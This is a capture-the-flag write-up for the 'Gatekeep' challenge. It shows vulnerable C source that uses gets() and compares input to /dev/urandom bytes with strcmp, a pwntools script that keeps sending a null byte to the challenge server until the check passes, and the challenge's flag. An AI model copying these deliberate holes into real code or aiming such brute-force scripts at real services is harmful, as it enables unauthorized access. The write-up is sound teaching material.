## Gatekeep

#### TL;DR 
Strcmp stops at null terminator. Binary uses strcmp to compare input with stuff generated by /dev/urandom. By spamming \x00, there is a 1/256 probability that the first byte from /dev/urandom is a \x00 and hence we are able to get the flag. 

#### Vulnerable source code
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

void print_flag() {
    char flag[256];

    FILE* flagfile = fopen("flag.txt", "r");
    
    if (flagfile == NULL) {
        puts("Cannot read flag.txt.");
    } else {
        fgets(flag, 256, flagfile);
        flag[strcspn(flag, "\n")] = '\0';
        puts(flag);
    }
}

int check(){
    char input[15];
    char pass[10];
    int access = 0;

    // If my password is random, I can gatekeep my flag! :)
    int data = open("/dev/urandom", O_RDONLY);
    if (data < 0)
    {
        printf("Can't access /dev/urandom.\n");
        exit(1);
    }
    else
    {
        ssize_t result = read(data, pass, sizeof pass);
        if (result < 0)
        {
            printf("Data not received from /dev/urandom\n");
            exit(1);
        }
    }
    close(data);
    
    printf("Password:\n");
    gets(input);

    if(strcmp(input, pass)) {
        printf("I swore that was the right password ...\n");
    }
    else {
        access = 1;
    }

    if(access) {
        printf("Guess I couldn't gaslight you!\n");
        print_flag();
    }
}

int main(){
    setbuf(stdout, NULL);
    printf("If I gaslight you enough, you won't be able to guess my password! :)\n");
    check();
    return 0;
}
```

As you can see, the binary uses strcmp to compare the stuff from /dev/urandom and our input. Our solution to this is to spam null bytes until /dev/urandom generates a null byte as the first character, which would let us pass the check. 

#### Solve script
```python
from pwn import *
import time

for i in range(1000):
    #proc = process("./gatekeep")
    proc = remote("lac.tf", 31121)
    proc.recvline()
    proc.recvline()
    time.sleep(0.1)
    proc.sendline(b"\x00")
    result = proc.recvline()
    print(result)
    if b"I swore that was the right password" not in result:
        print(result)
        proc.interactive()
        break
    proc.close
    time.sleep(0.2)
```

The flag is lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}.
